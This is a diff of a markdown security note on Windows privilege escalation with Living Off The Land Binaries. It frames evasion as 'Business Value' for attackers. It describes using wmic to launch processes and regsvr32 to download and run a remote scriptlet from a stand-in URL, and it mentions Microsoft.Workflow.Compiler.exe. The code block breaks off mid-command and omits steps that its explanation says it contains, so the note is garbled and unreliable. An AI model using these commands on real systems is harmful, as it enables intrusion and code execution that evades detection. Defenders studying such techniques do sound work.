@@ -31,6 +31,8 @@ Technical Explanation: The attacker can use a variety of Living Off The Land Bin
 
 Business Value: This procedure can be used by attackers to gain access to sensitive data or systems, which can lead to data theft, financial loss, or reputational damage. By using Living Off The Land Binaries and Scripts, the attacker can evade detection from security solutions and maintain persistence on the system.
 
+ 
+
 ## Requirements
 
 1. Access to a Windows system
@@ -38,6 +40,8 @@ Business Value: This procedure can be used by attackers to gain access to sensit
 1. Knowledge of Living Off The Land Binaries and Scripts
 
 1. Ability to execute malicious code
+
+ 
 
 ## Defense
 
@@ -47,18 +51,28 @@ Business Value: This procedure can be used by attackers to gain access to sensit
 
 1. Use security solutions that can detect and prevent the use of Living Off The Land Binaries and Scripts
 
+ 
+
 ## Objectives
 
 1. Escalate privileges on a Windows system
 
 1. Gain access to sensitive data or systems
 
+ 
+
 # Instructions
 
 1. This command executes malicious code on the target system. The 'wmic.exe process call create' command is used to create a new process for the 'calc' application, which can be replaced with any other executable. The 'regsvr32' command is used to register a DLL and execute its code. In this case, the DLL is downloaded from a remote server using the 'http://example.com/file.sct' URL. The 'Microsoft.Workflow.Compiler.exe' command is used to execute a workflow file, which can also contain malicious code.
 
+ 
+
+
+
 **Code**: [[wmic.exe process call create calc
 regsvr32 /s /n /]]
+
+
 
 > The 'wmic.exe process call create' command takes the name of the executable to run as an argument. The 'regsvr32' command takes several arguments: '/s' to run in silent mode, '/n' to not call DllRegisterServer, '/u' to unregister a DLL, and '/i' to specify the URL of the script to execute. The 'Microsoft.Workflow.Compiler.exe' command takes the name of the input workflow file and the name of the output file as arguments.
 
@@ -76,3 +90,5 @@ regsvr32 /s /n /]]
 
 - [[EoP - Living Off The Land Binaries and Scripts]]
 - [[Windows - Privilege Escalation]]
+
+
